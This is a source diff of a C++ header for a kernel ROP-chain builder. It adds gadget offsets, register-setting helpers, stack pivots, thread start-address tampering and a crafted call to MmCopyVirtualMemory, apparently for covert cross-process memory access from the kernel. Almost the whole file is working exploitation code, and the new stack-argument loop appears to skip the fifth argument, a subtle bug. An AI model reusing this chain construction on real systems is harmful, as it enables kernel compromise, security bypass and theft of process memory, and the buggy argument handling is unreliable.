@@ -1,4 +1,5 @@
-#pragma once
+﻿#pragma once
+#include <memory>
 #include <vector>
 #include <string_view>
 #include <include/driver/kernel_addresses.hpp>
@@ -6,7 +7,7 @@
 class StackManager
 {
 protected:
-	std::vector<std::uint64_t>* Stack = nullptr;
+    std::unique_ptr<std::vector<std::uint64_t>> Stack;
 private:
 	std::uintptr_t KernelModuleBase = NULL;
 	std::uintptr_t StackAllocAddress = NULL;
@@ -17,12 +18,7 @@ public:
 	StackManager(const std::uintptr_t _KernelModuleBase, const std::uintptr_t _StackAllocAddress, const size_t _StackSizeLimit = 0x2000)
 		: KernelModuleBase(_KernelModuleBase), StackAllocAddress(_StackAllocAddress), StackSizeLimit(_StackSizeLimit)
 	{
-		Stack = new std::vector<std::uint64_t>;
-	}
-
-	~StackManager()
-	{
-		delete[] Stack;
+        Stack = std::make_unique<std::vector<std::uint64_t>>();
 	}
 
     std::uint64_t* GetStackBuffer();
@@ -31,10 +27,23 @@ public:
     void AddValue(const std::uint64_t Value, const std::string_view& ValueLogName);
     void AddPadding(const std::size_t PaddingSize = 8);
     void ReadIntoRcx(const std::uint64_t ReadAddress);
+    void ReadRaxIntoRax();
+    void PivotToR11();
+    void MovRaxIntoR9();
+    void MovRaxIntoR8();
+    void SetR8(const std::uint64_t NewR8Value);
+    void SetR9(const std::uint64_t NewR9Value);
+    void SetRdx(const std::uint64_t NewRdxValue);
+    void SetRcxRdx(const std::uint64_t NewRcxValue, const std::uint64_t NewRdxValue);
+    void SetRaxRcxRdx(const std::uint64_t NewRaxValue, const std::uint64_t NewRcxValue, const std::uint64_t NewRdxValue);
     void ModifyThreadStartAddress(const std::uint64_t NewStartAddress);
     void ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBase, const std::uint64_t NewStackLimit);
-    void PivotToNewStack(StackManager* StackToPivot);
+    void CallMmCopyVirtualMemory(void* SourceProcess, void* SourceAddress, void* TargetProcess, void* TargetAddress, int PreviousMode, const std::size_t BufferSize, void* ReturnSize);
+    void PivotToNewStack(StackManager& StackToPivot);
+    void AwaitUsermode(const void* UmEventHandleAddress);
+    void SignalUsermode(const void* KmEventHandleAddress);
     void LoopBack();
+    void AlignStack();
 
     template<typename... Args>
     void AddFunctionCall(const std::string_view& FunctionName, Args&&... args)
@@ -47,45 +56,62 @@ public:
         {
             std::uint64_t ConvertedArgs[] = { static_cast<std::uint64_t>(args)... };
 
-            // Setting up the fourth gadget here, since there is no "pop r9; ret;" gadget universally.
-            // this gadget requires us to set up both r8 and rcx correctly, so we will just do this before
-            // all other args.
+            // Setting up the fourth gadget here, this gadget requires us to set up both r8 and rcx
+            // correctly, so we will be performing this before setting the rest of the arguments.
             if (ArgCount >= 4)
-            {
-                this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
-                this->AddValue(0, "set r8 to 0");
-                this->AddPadding(0x28);
-                this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
-                this->AddPadding(0x8);
-                this->AddValue(ConvertedArgs[3], "FourthArg");
-                this->AddPadding(0x10);
-                this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
-            }
+                this->SetR9(ConvertedArgs[3]);
 
             if (ArgCount >= 3)
-            {
-                this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
-                this->AddValue(ConvertedArgs[2], "ThirdArg");
-                this->AddPadding(0x28);
-            }
+                this->SetR8(ConvertedArgs[2]);
 
-            // If we have any args, we can place a value into rcx (arg1) and rdx (arg2) using a single gadget.
-            // The reason this is done instead of a 'pop rcx; ret;' and `pop rdx; ret;` is described in issue #12 on GitHub.
-            this->AddGadget(0xbac760, "mov rcx, qword ptr \[rsp \+ 8\]; mov rdx, qword ptr \[rsp \+ 0x10\]; add rsp, 0x20; ret;");
-            this->AddPadding(0x8);
-            this->AddValue(ConvertedArgs[0], "FirstArg");
-            this->AddValue(ConvertedArgs[1], "SecondArg");
-            this->AddPadding(0x8);
+            // If we have any args, we place a value into rcx (arg1) and rdx (arg2) using a single gadget.
+            this->SetRcxRdx(ConvertedArgs[0], ConvertedArgs[1]);
         }
 
-        if (this->GetStackSize() % 16 != 0)
-            this->AddGadget(0x20043b, "ret (align)");
+        // Align stack to 16 bytes prior to performing a function call.
+        this->AlignStack();
 
         this->AddGadget(FunctionAddress, "Function to call address");
-        this->AddGadget(0xbac76a, "add rsp, 0x20; ret;");
-        this->AddValue(0, "Shadow space 1");
-        this->AddValue(0, "Shadow space 2");
-        this->AddValue(0, "Shadow space 3");
-        this->AddValue(0, "Shadow space 4");
+
+        switch (ArgCount)
+        {
+        case 0:
+        case 1:
+        case 2:
+        case 3:
+        case 4:
+            this->AddGadget(0xbac76a, "add rsp, 0x20; ret;");
+            break;
+        case 5:
+            this->AddGadget(0x2005e3, "add rsp, 0x28; ret;");
+            break;
+        case 6:
+            this->AddGadget(0x200a54, "pop ...; pop ...; pop ...; pop ...; pop ...; pop ...; ret;");
+            break;
+        case 7:
+            this->AddGadget(0x20268c, "add rsp, 0x38; ret;");
+            break;
+        case 8:
+            this->AddGadget(0x3dec5c, "pop ...; add rsp, 0x20; pop ...; pop ...; pop ...; ret;");
+            break;
+        case 9:
+            this->AddGadget(0x216dce, "add rsp, 0x48; ret;");
+            break;
+        case 10:
+            this->AddGadget(0x72f29c, "pop ...; add rsp, 0x48; ret;");
+            break;
+        }
+
+        // Setup shadow stack space
+        this->AddPadding(0x20);
+
+        // Append stack arugments if they exist
+        if constexpr (ArgCount > 4)
+        {
+            std::uint64_t ConvertedArgs[] = { static_cast<std::uint64_t>(args)... };
+
+            for (std::size_t i = 5; i < ArgCount; i++)
+                this->AddValue(ConvertedArgs[i], "stack arg");
+        }
     }
 };
